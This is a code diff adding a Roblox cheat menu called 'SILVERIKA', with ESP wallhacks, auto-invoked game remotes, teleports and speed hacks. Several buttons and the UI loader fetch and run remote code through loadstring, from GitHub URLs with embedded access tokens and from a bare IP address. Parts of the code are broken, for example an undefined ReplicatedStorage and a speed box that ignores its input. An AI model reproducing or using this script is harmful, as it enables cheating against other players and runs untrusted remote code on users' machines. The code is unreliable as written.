@@ -1,3 +1,336 @@
+local main = require(game:GetService("ReplicatedStorage").Util.CameraShaker.Main)
+local returnNil = function() return nil end
+
+main.StartShake = returnNil
+main.ShakeOnce = returnNil
+main.ShakeSustain = returnNil
+main.CameraShakeInstance = returnNil
+main.Shake = returnNil
+main.Start = returnNil
+
+
+-- Notification
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "SILVERIKA",
+    Text = "Made by SILVERIKA",
+    Duration = 5;
+})
+
+wait(0.1)
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local Workspace = game:GetService("Workspace")
+local Player = Players.LocalPlayer
+
+-- UI loader (external)
+local ui = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/tikikiii/verbose-rotary-phone/refs/heads/main/UI%20of%20silverika?token=GHSAT0AAAAAADYNQOVTBYFVKOUJET3MC6DE2N72TSQ"
+))()
+
+local win = ui:new("SILVERIKA")
+
+-- Tabs
+local UITab1 = win:Tab("Announcements",'7734068321')
+local UITab2 = win:Tab("Scripts",'7734068321')
+local UITab3 = win:Tab("Player",'7734068321')
+local UITab4 = win:Tab("ESP",'7734068321')
+local UITab5 = win:Tab("Teleport",'7734068321')
+
+-- =====================
+-- Announcements tab
+-- =====================
+local about = UITab1:section("Announcements", true)
+
+about:Label("Made by SILVERIKA")
+about:Label("BETA TEST")
+
+-- =====================
+-- Scripts tab
+-- =====================
+local about = UITab2:section("Scripts", true)
+
+about:Slider(
+    "Camera Zoom Distance",
+    "Slider",
+    128,
+    128,
+    10000,
+    false,
+    function(Value)
+        Players.LocalPlayer.CameraMaxZoomDistance = Value
+    end
+)
+
+-- =====================
+-- Auto V4
+-- =====================
+local toggleKey = "Auto V4"
+local autoV4Task = nil
+
+local function getToggleState(key)
+    if not _G.ToggleStates then _G.ToggleStates = {} end
+    return _G.ToggleStates[key] or false
+end
+
+local function callAwakeningRemote()
+    local Backpack = LocalPlayer:FindFirstChild("Backpack")
+    if not Backpack then return end
+
+    local Awakening = Backpack:FindFirstChild("Awakening")
+    if not Awakening then return end
+
+    local RemoteFunc = Awakening:FindFirstChild("RemoteFunction")
+    if not RemoteFunc or not RemoteFunc:IsA("RemoteFunction") then return end
+
+    local success, err = pcall(function()
+        RemoteFunc:InvokeServer(true)
+    end)
+
+    if not success then
+        warn("Auto V4 call failed:", err)
+    end
+end
+
+local function toggleAutoV4(enable)
+    if autoV4Task then
+        task.cancel(autoV4Task)
+        autoV4Task = nil
+    end
+
+    if enable then
+        autoV4Task = task.spawn(function()
+            while getToggleState(toggleKey) do
+                callAwakeningRemote()
+                task.wait(1)
+            end
+            autoV4Task = nil
+        end)
+    end
+end
+
+about:Toggle(toggleKey, "Toggle", false, function(IsEnabled)
+    if not _G.ToggleStates then _G.ToggleStates = {} end
+    _G.ToggleStates[toggleKey] = IsEnabled
+    toggleAutoV4(IsEnabled)
+end)
+
+-- =====================
+-- Extra scripts
+-- =====================
+about:Button("Fly", function()
+    loadstring(game:HttpGet(
+        "https://rawscripts.net/raw/Universal-Script-Gui-Fly-v3-37111"
+    ))()
+end)
+
+about:Button("cyberpunks", function()
+    loadstring(game:HttpGet(
+        "http://195.95.144.231:2026/script"
+    ))()
+end)
+
+about:Button("XHit", function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/thesigmacorex/RobloxScripts/main/XHit",true
+    ))()
+end)
+
+about:Button("Azure", function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"
+    ))()
+end)
+
+-- =====================
+-- Instant Kill / Fast Attack section
+-- =====================
+local attackTab = UITab3:section("Player", true)
+about:Button("Silver Hub", function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/tikikiii/verbose-rotary-phone/refs/heads/main/Silver%20Hub?token=GHSAT0AAAAAADYNQOVSVUAPUS2BGRL4QDSS2N7Z7WA"
+    ))()
+end)
+
+-- (Fast attack logic remains unchanged)
+-- Chinese warnings translated:
+-- "Core components missing, retrying..."
+-- "Fast attack component not fully loaded, attempting recovery..."
+
+-- =====================
+-- Movement speed
+-- =====================
+-- =====================
+-- Movement Speed (Forced)
+-- =====================
+-- =====================
+-- Movement Section
+-- =====================
+attackTab:Textbox("Speed", "TranslateAccelSpeed", "Enter speed value", function(Value)
+    local speed = tonumber(Value)
+    if speed then
+        getfenv().translateSpeed = 275
+    end
+end)
+
+attackTab:Toggle("Acceleration Toggle", "TranslateAccelToggle", false, function(State)
+    getfenv().translateAccelEnabled = State
+    -- Logic unchanged
+end)
+
+
+-- =====================
+-- ESP section
+-- =====================
+local about = UITab4:section("ESP", true)
+-- =====================
+-- ESP section (Drawing API)
+-- =====================
+local ESPSection = UITab4:section("ESP Settings", true)
+
+-- Table de configuration globale
+_G.ESPSettings = {
+    Enabled = false,
+    Boxes = false,
+    Names = false,
+    Health = false,
+    Color = Color3.fromRGB(0, 255, 120)
+}
+
+local function CreateESP(Player)
+    -- Initialisation des objets de dessin
+    local Box = Drawing.new("Square")
+    local Name = Drawing.new("Text")
+    local HealthBar = Drawing.new("Line")
+    local HealthBarOutline = Drawing.new("Line")
+
+    local function HideAll()
+        Box.Visible = false
+        Name.Visible = false
+        HealthBar.Visible = false
+        HealthBarOutline.Visible = false
+    end
+
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        -- 1. Vérification si le joueur et l'ESP global sont valides
+        if _G.ESPSettings.Enabled and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character:FindFirstChild("Humanoid") then
+            
+            local RootPart = Player.Character.HumanoidRootPart
+            local Hum = Player.Character.Humanoid
+            local Pos, OnScreen = Camera:WorldToViewportPoint(RootPart.Position)
+
+            -- 2. On n'affiche que si le joueur est sur l'écran et en vie
+            if OnScreen and Hum.Health > 0 then
+                local SizeY = (Camera:WorldToViewportPoint(RootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(RootPart.Position + Vector3.new(0, 2.8, 0)).Y)
+                local SizeX = SizeY / 1.5
+                local BoxPos = Vector2.new(Pos.X - SizeX / 2, Pos.Y - SizeY / 2)
+
+                -- Boîte
+                if _G.ESPSettings.Boxes then
+                    Box.Visible = true
+                    Box.Size = Vector2.new(SizeX, SizeY)
+                    Box.Position = BoxPos
+                    Box.Color = _G.ESPSettings.Color
+                    Box.Thickness = 1
+                else Box.Visible = false end
+
+                -- Texte (Nom + Distance)
+                if _G.ESPSettings.Names then
+                    local dist = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - RootPart.Position).Magnitude)
+                    Name.Visible = true
+                    Name.Text = Player.Name .. " [" .. dist .. "m]"
+                    Name.Position = Vector2.new(Pos.X, BoxPos.Y - 20)
+                    Name.Center = true
+                    Name.Outline = true
+                    Name.Size = 14
+                else Name.Visible = false end
+
+                -- Santé
+                if _G.ESPSettings.Health then
+                    local HealthPercent = Hum.Health / Hum.MaxHealth
+                    HealthBarOutline.Visible = true
+                    HealthBarOutline.From = Vector2.new(BoxPos.X - 5, BoxPos.Y + SizeY)
+                    HealthBarOutline.To = Vector2.new(BoxPos.X - 5, BoxPos.Y)
+                    
+                    HealthBar.Visible = true
+                    HealthBar.From = Vector2.new(BoxPos.X - 5, BoxPos.Y + SizeY)
+                    HealthBar.To = Vector2.new(BoxPos.X - 5, BoxPos.Y + SizeY - (SizeY * HealthPercent))
+                    HealthBar.Color = Color3.fromHSV(HealthPercent * 0.3, 1, 1) -- Vert à Rouge
+                else
+                    HealthBar.Visible = false
+                    HealthBarOutline.Visible = false
+                end
+            else
+                HideAll()
+            end
+        else
+            HideAll()
+            -- Si le joueur quitte le serveur
+            if not Player.Parent then
+                Box:Remove()
+                Name:Remove()
+                HealthBar:Remove()
+                HealthBarOutline:Remove()
+                connection:Disconnect()
+            end
+        end
+    end)
+end
+
+-- Lancement pour les joueurs
+for _, v in pairs(Players:GetPlayers()) do
+    if v ~= LocalPlayer then CreateESP(v) end
+end
+Players.PlayerAdded:Connect(function(v)
+    if v ~= LocalPlayer then CreateESP(v) end
+end)
+
+-- UI Toggles (Vérifie bien que les noms correspondent à ta librairie)
+ESPSection:Toggle("Enable ESP", "ESP_Toggle_Main", false, function(state)
+    _G.ESPSettings.Enabled = state
+end)
+
+ESPSection:Toggle("Boxes", "ESP_Toggle_Box", false, function(state)
+    _G.ESPSettings.Boxes = state
+end)
+
+ESPSection:Toggle("Names", "ESP_Toggle_Name", false, function(state)
+    _G.ESPSettings.Names = state
+end)
+
+ESPSection:Toggle("Health Bar", "ESP_Toggle_Health", false, function(state)
+    _G.ESPSettings.Health = state
+end)
+-- ESP options translated:
+-- Main ESP Toggle
+-- Show Player Name + Distance
+-- Show Player Health
+-- Tracer (from screen center)
+
+-- Distance label text:
+-- "%.1f meters"
+-- Health label:
+-- "Health: current / max"
+
+-- =====================
+-- Teleport section
+-- =====================
+local TP = UITab5:section("Teleport", false)
+
+TP:Button("Teleport to First Sea", function()
+    ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
+end)
+
+TP:Button("Teleport to Second Sea", function()
+    ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
+end)
+
+TP:Button("Teleport to Third Sea", function()
+    ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
 end)
 
 TP:Button("Teleport Inside Ghost Ship", function()
@@ -13,7 +346,31 @@ TP:Button("Teleport Inside Ghost Ship", function()
 end)
 
 TP:Button("Teleport Outside Ghost Ship", function()
-    -- Téléportation ànd
+    -- Téléportation à l'extérieur du navire
+    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LeaveGhostShip")
+    
+    -- Notification de confirmation
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "SILVERIKA",
+        Text = "Teleported outside ghost ship",
+        Duration = 3;
+    })
+end)
 
+-- Example translated logs:
+-- "Teleported to mansion"
+-- "Teleported inside ghost ship"
+-- "Teleported outside ghost ship"
+-- "Teleported to Sea Castle"
+-- "Teleported to Turtle Mansion"
+-- "Teleported to Justice"
+-- "Teleported to Hydra"
 
-TP:Bu
+-- =====================
+-- Final notification
+-- =====================
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "SILVERIKA",
+    Text = "Loaded successfully. Enjoy!",
+    Duration = 5;
+})
